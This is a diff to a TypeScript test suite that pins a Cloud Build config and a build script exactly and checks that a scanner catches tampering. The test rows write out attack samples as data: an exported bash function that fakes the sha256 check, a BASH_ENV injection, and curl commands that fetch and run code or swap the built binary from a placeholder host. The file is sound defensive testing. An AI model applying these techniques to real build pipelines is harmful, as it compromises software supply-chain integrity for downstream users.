@@ -9,10 +9,13 @@ import {
 } from '../infra/bun-base/unpinned.mjs';
 import {
   CONSUMED,
+  ENV_READS,
   NET_EXACT,
   normalize,
   parseScript,
+  REVIEWED_CLOUDBUILD,
   scanBuildScript,
+  scanCloudbuild,
   type Unpinned,
 } from './helpers/bun-base-scan';
 
@@ -41,6 +44,148 @@ describe('cloudbuild.yaml runs as the dedicated build SA', () => {
   it('SBOMs the built artifacts, not only the source tree', () => {
     expect(cloudbuild).toMatch(/scan, dir:\/workspace\/out\b/);
     expect(cloudbuild).toContain('bun-artifacts.cdx.json.sha256');
+  });
+});
+
+// round 12 (review-1469-r11 HIGH-1): cloudbuild.yaml is what RUNS build.sh, and it was guarded only by
+// three regexes. A build-step env entry replaced `sha256sum` with an exported bash function, another
+// sourced a file first, an extra step swapped the verified binary, `args` ran another script, and
+// `options.env` reached every step — each with every suite green. It is now parsed as YAML and pinned
+// exactly (tests/helpers/bun-base-scan.ts, REVIEWED_CLOUDBUILD); each row below is matched on the
+// message of the rule that owns it.
+describe('cloudbuild.yaml is pinned exactly (parsed as YAML, not matched as text)', () => {
+  const raw = readFileSync(resolve(dir, 'cloudbuild.yaml'), 'utf8');
+  const edit = (from: string, to: string) => {
+    expect(raw.split(from).length, `anchor occurs exactly once: ${from}`).toBe(2);
+    return raw.replace(from, () => to);
+  };
+  const BUILD_ENV = '    env: [BUILD_ID=$BUILD_ID, BUN_BASE_TARGETS=$_TARGETS]';
+  const withBuildEnv = (entry: string) =>
+    edit(BUILD_ENV, `    env: [BUILD_ID=$BUILD_ID, BUN_BASE_TARGETS=$_TARGETS, ${entry}]`);
+
+  it('the committed cloudbuild.yaml is exactly the reviewed config', () => {
+    expect(scanCloudbuild(raw)).toEqual([]);
+    expect(parse(raw)).toStrictEqual(JSON.parse(JSON.stringify(REVIEWED_CLOUDBUILD)));
+  });
+
+  it('pins every step image by digest', () => {
+    for (const s of REVIEWED_CLOUDBUILD.steps) expect(s.name).toMatch(/@sha256:[0-9a-f]{64}$/);
+  });
+
+  it.each<[string, () => string, RegExp]>([
+    [
+      'Y1: BASH_FUNC_sha256sum%% in the build step env (an exported function replaces the verifier)',
+      () => withBuildEnv("'BASH_FUNC_sha256sum%%=() { cat >/dev/null; echo OK; }'"),
+      /^step build: env entries not reviewed: .*BASH_FUNC_sha256sum%%/m,
+    ],
+    [
+      'Y2: BASH_ENV in the build step env (a file is sourced before build.sh)',
+      () => withBuildEnv('BASH_ENV=/workspace/patches/README.md'),
+      /^step build: env entries not reviewed: .*BASH_ENV=/m,
+    ],
+    [
+      'Y3: an extra step after build swaps the verified binary',
+      () =>
+        edit(
+          '  - id: sbom\n',
+          "  - id: fixup\n    name: ubuntu:24.04@sha256:008173c23f95b170204355c12626cb5a965d779a7e1283b09e9cffbb1bf33ca3\n    entrypoint: bash\n    args: [-c, 'curl -fsSLo /workspace/out/bun-linux-x64-musl https://e.invalid/bun']\n  - id: sbom\n",
+        ),
+      /^step ids \["build","fixup","sbom"/m,
+    ],
+    [
+      'Y4: the build step runs another script instead of build.sh',
+      () =>
+        edit(
+          '    args: [/workspace/build.sh]',
+          "    args: [-c, 'curl -fsSL https://e.invalid/b.sh -o /tmp/b && bash /tmp/b']",
+        ),
+      /^step build: args differs/m,
+    ],
+    [
+      'Y5: options.env reaches every step (APT_CONFIG, GIT_CONFIG_PARAMETERS)',
+      () =>
+        edit(
+          '  logging: CLOUD_LOGGING_ONLY\n',
+          `  logging: CLOUD_LOGGING_ONLY\n  env: [APT_CONFIG=/workspace/patches/README.md, "GIT_CONFIG_PARAMETERS='http.sslVerify=false'"]\n`,
+        ),
+      /^options\.env is not reviewed/m,
+    ],
+    [
+      'options.secretEnv',
+      () =>
+        edit(
+          '  logging: CLOUD_LOGGING_ONLY\n',
+          '  logging: CLOUD_LOGGING_ONLY\n  secretEnv: [T]\n',
+        ),
+      /^options\.secretEnv is not reviewed/m,
+    ],
+    [
+      'secretEnv on a step',
+      () =>
+        edit(
+          '    args: [/workspace/build.sh]\n',
+          '    args: [/workspace/build.sh]\n    secretEnv: [T]\n',
+        ),
+      /^step build: secretEnv is not reviewed/m,
+    ],
+    [
+      'a top-level availableSecrets',
+      () =>
+        edit(
+          'timeout: 7200s\n',
+          'timeout: 7200s\navailableSecrets:\n  secretManager: [{versionName: projects/p/secrets/s/versions/1, env: T}]\n',
+        ),
+      /^top-level keys .*"availableSecrets"/m,
+    ],
+    [
+      'an extra substitution',
+      () => edit('  _TARGETS: x64 aarch64\n', '  _TARGETS: x64 aarch64\n  _EXTRA: x\n'),
+      /^substitutions\._EXTRA is not reviewed/m,
+    ],
+    [
+      'the build image by tag instead of digest',
+      () =>
+        edit(
+          '    name: ubuntu:24.04@sha256:008173c23f95b170204355c12626cb5a965d779a7e1283b09e9cffbb1bf33ca3\n    entrypoint: bash\n    args: [/workspace/build.sh]',
+          '    name: ubuntu:24.04\n    entrypoint: bash\n    args: [/workspace/build.sh]',
+        ),
+      /^step build: name differs/m,
+    ],
+    [
+      'a later step env changed',
+      () => edit('SYFT_FILE_METADATA_DIGESTS=sha256', 'SYFT_FILE_METADATA_DIGESTS=md5'),
+      /^step sbom-artifacts: env entries not reviewed/m,
+    ],
+    [
+      'the upload script changed',
+      () =>
+        edit(
+          '        cat SHA256SUMS\n',
+          '        cat SHA256SUMS\n        cp /tmp/x /workspace/out/bun-linux-x64-musl\n',
+        ),
+      /^step digests-and-upload: args differs/m,
+    ],
+    [
+      'the build step env reordered (order is pinned too)',
+      () => edit(BUILD_ENV, '    env: [BUN_BASE_TARGETS=$_TARGETS, BUILD_ID=$BUILD_ID]'),
+      /^step build: env differs/m,
+    ],
+    [
+      'a duplicate key',
+      () => edit('timeout: 7200s\n', 'timeout: 7200s\ntimeout: 1s\n'),
+      /YAML error/,
+    ],
+    [
+      'a YAML alias (a value spelled somewhere other than where it is used)',
+      () =>
+        edit('  - id: build\n', '  - id: &b build\n').replace(
+          '  - id: sbom\n',
+          () => '  - id: sbom\n    tags: [*b]\n',
+        ),
+      /^cloudbuild\.yaml YAML error: .*alias/im,
+    ],
+  ])('goes RED on: %s', (_n, mutate, why) => {
+    expect(scanCloudbuild(mutate()).join('\n')).toMatch(why);
   });
 });
 
@@ -742,6 +887,103 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
     expect(v.join('\n')).toMatch(why);
   });
 
+  // round 12 (review-1469-r11 HIGH-1): rules 4 and 13 judged the binding sites that EXIST, so deleting
+  // a pinned name's only line left nothing to judge — the value then came from the executor's
+  // environment (one cloudbuild.yaml `env:` entry), with every verifier still running as reviewed.
+  // Rule 14 requires each pinned name's site; rule 15 requires every READ name to be bound before it
+  // is read, or to be a bash special/implicit name, or to be on ENV_READS. Each row is matched on its
+  // OWN rule's message (anchored at a line start), never on a neighbouring rule's.
+  const drop = (line: string, src = real) => sub(line, '', src);
+  const neverBound = (n: string) => new RegExp(`^${n} is never bound — a pinned name`, 'm');
+  const unboundRead = (n: string) =>
+    new RegExp(`^line \\d+: reads \\$${n}, which the script never binds`, 'm');
+  it.each<[string, () => string, RegExp]>([
+    [
+      'E1: UPSTREAM_SHA line deleted',
+      () => drop('UPSTREAM_SHA="${PREFIX%%-*}"\n'),
+      neverBound('UPSTREAM_SHA'),
+    ],
+    [
+      'E2: … and the manifest upstream_sha re-derived from PREFIX (keeps the workflow jq check green)',
+      () =>
+        sub(
+          '"upstream_sha": "$UPSTREAM_SHA",',
+          '"upstream_sha": "${PREFIX%%-*}",',
+          drop('UPSTREAM_SHA="${PREFIX%%-*}"\n'),
+        ),
+      neverBound('UPSTREAM_SHA'),
+    ],
+    ['E3: fpr line deleted', () => drop(`${FPR_LINE}\n`), neverBound('fpr')],
+    ['E4: headshort line deleted', () => drop(`  ${HEADSHORT_LINE}\n`), neverBound('headshort')],
+    [
+      'E5: wkkey line deleted',
+      () => drop(`  wkkey="$(printf '%s' "$wkurl" | sha256sum | cut -c1-32)"\n`),
+      neverBound('wkkey'),
+    ],
+    [
+      'E6: the committed LLVM_SIGNER_FPR pin deleted',
+      () => drop(`${/^LLVM_SIGNER_FPR=.*$/m.exec(real)![0]}\n`),
+      neverBound('LLVM_SIGNER_FPR'),
+    ],
+    [
+      'E7: WS=/workspace deleted (WS roots every pin path)',
+      () => drop('WS=/workspace\n'),
+      neverBound('WS'),
+    ],
+    [
+      'E8: HEAD_SHA line deleted',
+      () => drop('HEAD_SHA="$(git rev-parse HEAD)"\n'),
+      neverBound('HEAD_SHA'),
+    ],
+    // rule 15, on names rule 14 does not list
+    [
+      'E1 via rule 15: the unbound UPSTREAM_SHA read',
+      () => drop('UPSTREAM_SHA="${PREFIX%%-*}"\n'),
+      unboundRead('UPSTREAM_SHA'),
+    ],
+    [
+      'rule 15: a read of an environment variable nobody reviewed',
+      () => add('echo "$GIT_SSL_NO_VERIFY"'),
+      unboundRead('GIT_SSL_NO_VERIFY'),
+    ],
+    [
+      'rule 15: a non-pinned name read with its only line deleted',
+      () => drop('  bd="build/release-linux-$arch-musl"\n'),
+      unboundRead('bd'),
+    ],
+    [
+      'rule 15: a read BEFORE the name is bound (sees the environment)',
+      () => add('echo "$wk"'),
+      /^line \d+: reads \$wk before its first binding site \(line \d+\)/m,
+    ],
+    [
+      'rule 15: a self-read in the binding line (`X="$X"` is evaluated before X is bound)',
+      () => sub('repo="https://dl-cdn', 'repo="$repo/https://dl-cdn'),
+      /^line \d+: reads \$repo before its first binding site/m,
+    ],
+  ])('goes RED on (round 12): %s', (_n, mutate, why) => {
+    expect(scan(mutate()).join('\n')).toMatch(why);
+  });
+
+  it('ENV_READS is load-bearing: build.sh reads every allowlisted name (no stale entry)', () => {
+    const reads = new Set(parseScript(real).reads.map((r) => r.name));
+    for (const n of Object.keys(ENV_READS))
+      expect({ n, read: reads.has(n) }).toEqual({ n, read: true });
+  });
+
+  it("ENV_READS matches what cloudbuild.yaml's build step exports (the image supplies only PATH)", () => {
+    const step = (
+      parse(readFileSync(resolve(dir, 'cloudbuild.yaml'), 'utf8')) as {
+        steps: { id: string; env?: string[] }[];
+      }
+    ).steps.find((s) => s.id === 'build');
+    expect((step?.env ?? []).map((e) => e.split('=')[0]).sort()).toEqual(
+      Object.keys(ENV_READS)
+        .filter((n) => n !== 'PATH')
+        .sort(),
+    );
+  });
+
   it.each<[string, (s: string) => string, RegExp]>([
     [
       'a fake pin() plus a curl in prefix.sh',
@@ -757,6 +999,16 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
       'the upstream sha rebound after its format check (single-site rule)',
       (s) => s.replace('cd "$here/patches"', () => 'sha=0000\ncd "$here/patches"'),
       /sha has 2 assignment sites/,
+    ],
+    [
+      'round 12 rule 15: the upstream sha taken from the environment (its line deleted)',
+      (s) => s.replace(/^sha=.*\n/m, () => ''),
+      /^line \d+: reads \$sha, which the script never binds/m,
+    ],
+    [
+      "round 12 rule 15: build.sh's environment allowlist does not extend to prefix.sh",
+      (s) => s.replace('cd "$here/patches"', () => 'echo "$BUN_BASE_TARGETS"\ncd "$here/patches"'),
+      /^line \d+: reads \$BUN_BASE_TARGETS, which the script never binds/m,
     ],
   ])('prefix.sh goes RED on: %s', (_n, mutate, why) => {
     expect(scanPrefix(mutate(prefix)).join('\n')).toMatch(why);
